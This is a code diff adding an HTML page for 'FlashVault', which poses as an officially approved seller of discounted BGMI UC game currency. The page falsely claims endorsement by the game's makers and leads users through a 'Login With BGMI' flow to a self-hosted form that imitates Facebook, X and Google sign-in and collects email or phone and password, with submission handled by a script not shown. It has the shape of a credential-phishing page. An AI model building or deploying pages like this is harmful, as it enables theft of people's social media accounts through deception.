@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>FlashVault · official BGMI UC</title>
+
+  <!-- Font Awesome 6 -->
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+  <!-- Google Font: Inter -->
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+
+  <!-- External CSS -->
+
+  <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+  <div class="blur-overlay"></div>
+
+  <div class="blur-layer-2"></div>
+
+  <div class="container">
+
+    <nav class="navbar">
+
+      <div class="logo">Flash<span>Vault</span></div>
+
+      <div class="nav-links">
+
+        <a href="#" id="homeLink">Home</a>
+
+        <a href="#" id="packsLink">Packs</a>
+
+        <a href="#" id="rewardsLink">Rewards</a>
+
+        <a href="#" id="supportLink">Support</a>
+
+      </div>
+
+      <button class="login-btn" id="openLoginModal">Login With BGMI</button>
+
+    </nav>
+
+    <section class="hero">
+
+      <div class="badge"><i class="fa-regular fa-circle-check"></i>Approved by BGMI Officials</div>
+
+      <h1>Load UC instantly with <span>FlashVault</span></h1>
+
+      <p>Secure, lightning fast delivery with exclusive discounts for BGMI players</p>
+
+      <div class="cta-buttons">
+
+        <button class="btn-primary" id="viewPacksBtn">View UC Packs</button>
+
+        <button class="btn-outline" id="howItWorksBtn">How It Works</button>
+
+      </div>
+
+    </section>
+
+    <div class="section-title" id="packsTitle"><span class="gold">Premium</span> UC Packs</div>
+
+    <div class="pack-grid" id="packGrid">
+
+      <!-- 60 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-gem"></i></div>
+
+        <div class="pack-name">60 UC</div>
+
+        <div class="pack-desc">Starter</div>
+
+        <div class="pack-price">₹30 <small>₹35</small><span class="offer">14% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-clock"></i> 2 min</div>
+
+      </div>
+
+      <!-- 360 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-gem"></i></div>
+
+        <div class="pack-name">360 UC</div>
+
+        <div class="pack-desc">Popular</div>
+
+        <div class="pack-price">₹159 <small>₹199</small><span class="offer">20% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-star"></i> +30 free</div>
+
+      </div>
+
+      <!-- 660 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-crown"></i></div>
+
+        <div class="pack-name">660 UC</div>
+
+        <div class="pack-desc">Elite</div>
+
+        <div class="pack-price">₹289 <small>₹359</small><span class="offer">19% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-bolt"></i> +60 free</div>
+
+      </div>
+
+      <!-- 1200 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-gem"></i></div>
+
+        <div class="pack-name">1200 UC</div>
+
+        <div class="pack-desc">Pro</div>
+
+        <div class="pack-price">₹499 <small>₹649</small><span class="offer">23% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-fire"></i> +120 free</div>
+
+      </div>
+
+      <!-- 3600 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-gem"></i></div>
+
+        <div class="pack-name">3600 UC</div>
+
+        <div class="pack-desc">Dominator</div>
+
+        <div class="pack-price">₹1399 <small>₹1799</small><span class="offer">22% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-crown"></i> +400 free</div>
+
+      </div>
+
+      <!-- 6800 UC -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-gem"></i></div>
+
+        <div class="pack-name">6800 UC</div>
+
+        <div class="pack-desc">Legendary</div>
+
+        <div class="pack-price">₹2499 <small>₹3299</small><span class="offer">24% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-star"></i> +900 free</div>
+
+      </div>
+
+      <!-- 12000 UC - legendary golden glow -->
+
+      <div class="pack-card">
+
+        <div class="pack-icon"><i class="fa-regular fa-crown"></i></div>
+
+        <div class="pack-name">12000 UC</div>
+
+        <div class="pack-desc">Mythic</div>
+
+        <div class="pack-price">₹4299 <small>₹5899</small><span class="offer">27% off</span></div>
+
+        <button class="btn-pack">Buy now</button>
+
+        <div class="official-tag"><i class="fa-regular fa-gem"></i> +1800 free</div>
+
+      </div>
+
+    </div>
+
+    <div class="features" id="features">
+
+      <div class="feature-item"><i class="fa-regular fa-shield-halved"></i><h4>Official Partner</h4><p>BGMI Approved</p></div>
+
+      <div class="feature-item"><i class="fa-regular fa-bolt"></i><h4>Instant Delivery</h4><p>Under 60 Seconds</p></div>
+
+      <div class="feature-item"><i class="fa-regular fa-message"></i><h4>24/7 Support</h4><p>Real Humans</p></div>
+
+      <div class="feature-item"><i class="fa-regular fa-credit-card"></i><h4>Secure Payments</h4><p>Encrypted</p></div>
+
+    </div>
+
+    <div class="login-bar" id="loginBar">
+
+      <span>Connect Your BGMI Account:</span>
+
+      <div class="social-icons">
+
+        <i class="fa-brands fa-facebook"></i>
+
+        <i class="fa-brands fa-x-twitter"></i>
+
+        <i class="fa-brands fa-google"></i>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <div class="footer">
+
+    <div class="container"><p>© 2025 FlashVault — officially approved BGMI UC service. All rights reserved.</p></div>
+
+  </div>
+
+  <!-- HOW IT WORKS MODAL -->
+
+  <div class="modal-overlay" id="howModal">
+
+    <div class="how-modal-content">
+
+      <h2>How It Works</h2>
+
+      <div class="steps">
+
+        <div class="step"><div class="step-icon"><i class="fa-regular fa-id-card"></i></div><div class="step-text"><h4>1. Login with BGMI</h4><p>Use Facebook, X or Google – secure & instant</p></div></div>
+
+        <div class="step"><div class="step-icon"><i class="fa-regular fa-cart-shopping"></i></div><div class="step-text"><h4>2. Select UC pack</h4><p>Choose from 7 premium packs with huge bonuses</p></div></div>
+
+        <div class="step"><div class="step-icon"><i class="fa-regular fa-credit-card"></i></div><div class="step-text"><h4>3. Secure payment</h4><p>Pay via UPI, card or wallet – encrypted</p></div></div>
+
+        <div class="step"><div class="step-icon"><i class="fa-regular fa-clock"></i></div><div class="step-text"><h4>4. Instant loading</h4><p>UC delivered to your BGMI ID in under 60s</p></div></div>
+
+      </div>
+
+      <button class="how-close" id="closeHowModal">got it</button>
+
+    </div>
+
+  </div>
+
+  <!-- LOGIN SELECTION MODAL (Step 1) -->
+
+  <div class="modal-overlay" id="loginSelectModal">
+
+    <div class="modal-content">
+
+      <h2>Flash<span>Vault</span></h2>
+
+      <p style="color:#94A3B8; margin-bottom:30px;">Choose Login Method</p>
+
+      
+
+      <div class="social-login">
+
+        <button class="social-btn" id="selectFacebook"><i class="fa-brands fa-facebook"></i> Continue with Facebook</button>
+
+        <button class="social-btn" id="selectTwitter"><i class="fa-brands fa-x-twitter"></i> Continue with X</button>
+
+        <button class="social-btn" id="selectGoogle"><i class="fa-brands fa-google"></i> Continue with Google</button>
+
+      </div>
+
+      
+
+      <div style="color:#64748B; font-size:0.8rem; margin:20px 0;">Your BGMI ID will be linked securely</div>
+
+      <button class="close-modal" id="closeLoginSelectModal">Close</button>
+
+    </div>
+
+  </div>
+
+  <!-- CREDENTIAL MODAL (Step 2) - FIXED with dynamic elements -->
+
+  <div class="modal-overlay" id="credentialModal">
+
+    <div class="modal-content" style="max-width: 400px;">
+
+      <div style="display: flex; justify-content: center; margin-bottom: 15px;">
+
+        <div style="width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #1A1A1A;">
+
+          <i class="fa-brands fa-facebook" id="platformIcon" style="font-size: 2.5rem; color: #1877f2;"></i>
+
+        </div>
+
+      </div>
+
+      <h2 style="font-size: 1.8rem; margin-bottom: 5px;" id="credentialTitle">Facebook Login</h2>
+
+      <p style="color:#94A3B8; margin-bottom: 25px; font-size: 0.9rem;">Enter your credentials to continue</p>
+
+      
+
+      <form id="credentialForm">
+
+        <input type="hidden" id="loginType" value="facebook">
+
+        
+
+        <div style="margin-bottom: 20px; text-align: left;">
+
+          <label id="emailLabel" style="color: #94A3B8; font-size: 0.85rem; margin-bottom: 5px; display: block;">Email or Phone</label>
+
+          <input type="text" id="loginEmail" placeholder="Enter email or phone" required style="width: 100%; padding: 14px; background: #1A1A1A; border: 1px solid #333; border-radius: 8px; color: white; font-size: 0.95rem;">
+
+        </div>
+
+        
+
+        <div style="margin-bottom: 25px; text-align: left;">
+
+          <label style="color: #94A3B8; font-size: 0.85rem; margin-bottom: 5px; display: block;">Password</label>
+
+          <input type="password" id="loginPassword" placeholder="Enter password" required style="width: 100%; padding: 14px; background: #1A1A1A; border: 1px solid #333; border-radius: 8px; color: white; font-size: 0.95rem;">
+
+        </div>
+
+        
+
+        <button type="submit" id="submitBtn" class="social-btn" style="background: #1877f2; border: none; width: 100%;">Login</button>
+
+      </form>
+
+      
+
+      <div style="margin-top: 20px; font-size: 0.8rem; color: #64748B;">
+
+        We'll never post without your permission
+
+      </div>
+
+      
+
+      <button class="close-modal" id="closeCredentialModal" style="margin-top: 20px;">Back</button>
+
+    </div>
+
+  </div>
+
+  <!-- External JavaScript -->
+
+  <script src="script.js"></script>
+
+</body>
+
+</html>
